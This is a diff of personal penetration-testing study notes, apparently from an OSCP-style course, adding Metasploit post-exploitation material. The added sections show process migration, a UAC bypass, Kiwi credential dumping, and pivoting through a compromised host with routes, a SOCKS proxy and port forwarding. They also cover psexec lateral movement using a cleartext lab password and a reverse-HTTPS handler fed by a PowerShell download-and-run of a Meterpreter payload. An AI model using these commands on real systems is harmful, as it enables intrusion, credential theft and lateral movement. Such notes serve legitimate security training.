@@ -1932,7 +1932,7 @@ Reference
   ``` 
 - Display idle time from current user
   `meterpreter > idletime`
-- Display the assigned privileges to our user in an interactive shell  
+- **Display the assigned privileges** to our user in an interactive shell  
   ```
   meterpreter > shell
   C:\Users\luiza> whoami /priv
@@ -1954,18 +1954,18 @@ Reference
   2552   8500  met.exe
   8052   4892  OneDrive.exe
   ```
-- Migrate to explorer.exe  
+- **Migrate to explorer.exe**  
   ```
   meterpreter > migrate 8052
   [*] Migrating from 2552 to 8052... 
   ```
-- Migrate to a newly spawned Notepad process  
+- **Migrate to a newly spawned Notepad process**  
   ```
   meterpreter > execute -H -f notepad
   Process 2720 created
   meterpreter > migrate 2720
   ```
-- Reviewing integrity level  
+- **Reviewing integrity** level  
   ```
   meterpreter > shell
   C:\Windows\system32> powershell -ep bypass
@@ -1985,7 +1985,7 @@ Reference
   ...
    11  exploit/windows/local/bypassuac_sdclt
   ```
-- Executing a UAC bypass using a Meterpreter session  
+- Executing a **UAC bypass** using a Meterpreter session  
   ```
   msf6 exploit(multi/handler) > use exploit/windows/local/bypassuac_sdclt
   msf6 exploit(windows/local/bypassuac_sdclt) > show options
@@ -1997,7 +1997,7 @@ Reference
   Get-NtTokenIntegrityLevel
   High
   ```
-- Load the Kiwi module and execute creds_msv to retrieve credentials of the system  
+- Load the **Kiwi** module and execute creds_msv to retrieve credentials of the system  
   ```
   meterpreter > load kiwi
   meterpreter > help
@@ -2006,10 +2006,91 @@ Reference
   creds_msv				 Retrieve LM/NTLM creds (parsed)
   ```
   meterpreter > creds_msv
-- ddd
+- Pivoting with metasploit
+  - Dual interfaces on compromised client > Ethernet0 192.168.50.223 + Ethernet1 172.16.5.199
+    `C:\Users\luiza> ipconfig`  
+  - Adding route to network 172.16.5.0/24 from session 2
+    ```
+    msf6 exploit(multi/handler) > route add 172.16.5.0/24 12
+    msf6 exploit(multi/handler) > route prin
+    ```
+  - With a path created to the internal network, we can enumerate this subnet
+    ```
+    msf6 exploit(multi/handler) > use auxiliary/scanner/portscan/tcp
+    msf6 auxiliary(scanner/portscan/tcp) > set RHOSTS 172.16.5.200 //172.16.5.0/24 
+    msf6 auxiliary(scanner/portscan/tcp) > set PORTS 445,3389
+    msf6 auxiliary(scanner/portscan/tcp) > run
+    ...
+    [+] 172.16.5.200:         - 172.16.5.200:445 - TCP OPEN
+    [+] 172.16.5.200:         - 172.16.5.200:3389 - TCP OPEN
+    ```
+  - use the psexec module to get access on the second target as user luiza
+  - retrieved the NTLM hash via Kiwi and clear password "BoccieDearAeroMeow1!"
+  - For psexec to succeed. luiza has to be a local administrator on the second machine
+  - used the psexec exploit module to obtain a Meterpreter shell
+    ```
+    msf6 auxiliary(scanner/portscan/tcp) > use exploit/windows/smb/psexec
+    msf6 exploit(windows/smb/psexec) > set SMBUser luiza
+    msf6 exploit(windows/smb/psexec) > set SMBPass "BoccieDearAeroMeow1!"
+    msf6 exploit(windows/smb/psexec) > set RHOSTS 172.16.5.200
+    msf6 exploit(windows/smb/psexec) > set payload windows/x64/meterpreter/bind_tcp
+    msf6 exploit(windows/smb/psexec) > set LPORT 8000
+    msf6 exploit(windows/smb/psexec) > run
+    ```
+  - alternative, use the autoroute post-exploitation module to set up pivot routes through an existing Meterpreter session
+    remove the previous route + terminated the previous meterpreter sessions + route flush  
+    ```
+    msf6 exploit(windows/smb/psexec) > use multi/manage/autoroute
+    msf6 post(multi/manage/autoroute) > show options
+    msf6 post(multi/manage/autoroute) > sessions -l
+    msf6 post(multi/manage/autoroute) > set session 12
+    msf6 post(multi/manage/autoroute) > run
+    ```
+  - Setting up a SOCKS5 proxy using the autoroute module  
+    ```
+    msf6 post(multi/manage/autoroute) > use auxiliary/server/socks_proxy
+    msf6 auxiliary(server/socks_proxy) > show options
+    msf6 auxiliary(server/socks_proxy) > set SRVHOST 127.0.0.1
+    msf6 auxiliary(server/socks_proxy) > set VERSION 5
+    msf6 auxiliary(server/socks_proxy) > run -j
+    ```
+  - Updated proxychains configuration /etc/proxychains4.conf  
+    `tail /etc/proxychains4.conf`
+  - Gaining remote desktop access inside the internal network  
+    `kali@kali:~$ sudo proxychains xfreerdp /v:172.16.5.200 /u:luiza`  
+  - portfwd command
+    `meterpreter > portfwd -h`  
+    `meterpreter > portfwd add -l 3389 -p 3389 -r 172.16.5.200`  
+    `kali@kali:~$ sudo xfreerdp /v:127.0.0.1 /u:luiza`  
 
-**Automating metasploit**
-- 
+**Automating metasploit**  
+- activate module
+  ```
+  use exploit/multi/handler
+  set PAYLOAD windows/meterpreter_reverse_https
+  set LHOST 192.168.119.4
+  set LPORT 443
+  ```
+- Set AutoRunScript to the migrate module
+  `set AutoRunScript post/windows/manage/migrate`
+- Set ExitOnSession to false to keep the multi/handler listening after a connection
+  `set ExitOnSession false`
+- run it as a job in the background and to stop us from automatically interacting with the session
+  `run -z -j`
+- Executing the resource script
+  `kali@kali:~$ sudo msfconsole -r listener.rc`
+- Executing the Windows executable containing the Meterpreter payload
+  `PS C:\Users\justin> iwr -uri http://192.168.119.4/met.exe -Outfile met.exe`  
+  `PS C:\Users\justin> .\met.exe`  
+- Incoming connection and successful migration to a newly spawned Notepad process
+  ```
+  [*] Spawning notepad.exe process to migrate into
+  [*] Migrating into 5340
+  [+] Successfully migrated into process 5340
+  ```
+- Listing all resource scripts provided by Metasploit
+  `kali@kali:~$ ls -l /usr/share/metasploit-framework/scripts/resource`
+- ddd
 ### 22. Active directory introduction and enumeration
 ### 23. Attacking active drectiory authentication
 ### 24. Lateral movement in active directory
@@ -3556,7 +3637,32 @@ Reference
   msf6 exploit(windows/local/bypassuac_sdclt) > use post/windows/gather/enum_hostfile
   msf6 post(windows/gather/enum_hostfile) > set SESSION 6
   ```
-- ddd  
+- **pivot with metasploit**
+  - `PS C:\Users\luiza> ipconfig`
+  - Add route and scan for SMB, RDP port
+    ```
+    msf6 exploit(multi/handler) > route add 172.16.186.0/24 1
+    msf6 exploit(multi/handler) > route print
+
+    msf6 exploit(multi/handler) > use auxiliary/scanner/portscan/tcp
+    msf6 auxiliary(scanner/portscan/tcp) > set RHOSTS 172.16.186.200 
+    msf6 auxiliary(scanner/portscan/tcp) > set PORTS 445, 3389
+    msf6 auxiliary(scanner/portscan/tcp) > run
+    ```
+  - authenticate to a remote Windows system over SMB  
+    ```
+    msf6 auxiliary(scanner/portscan/tcp) > use exploit/windows/smb/psexec
+    msf6 exploit(windows/smb/psexec) > set SMBUser luiza
+    msf6 exploit(windows/smb/psexec) > set SMBPass "BoccieDearAeroMeow1!"
+    msf6 exploit(windows/smb/psexec) > set RHOSTS 172.16.186.200
+    msf6 exploit(windows/smb/psexec) > set payload windows/x64/meterpreter/bind_tcp
+    msf6 exploit(windows/smb/psexec) > set LPORT 8000
+    msf6 exploit(windows/smb/psexec) > run
+    ```
+  - add port forward via meterpreter  
+    `meterpreter > portfwd add -l 3389 -p 3389 -r 172.16.186.200`
+  - RDP  
+    `xfreerdp3 /u:luiza /p:BoccieDearAeroMeow1! /v:127.0.0.1 /cert:ignore /drive:share,/home/kali/share`
 
 ## Penetration testing report 
 - note editor:
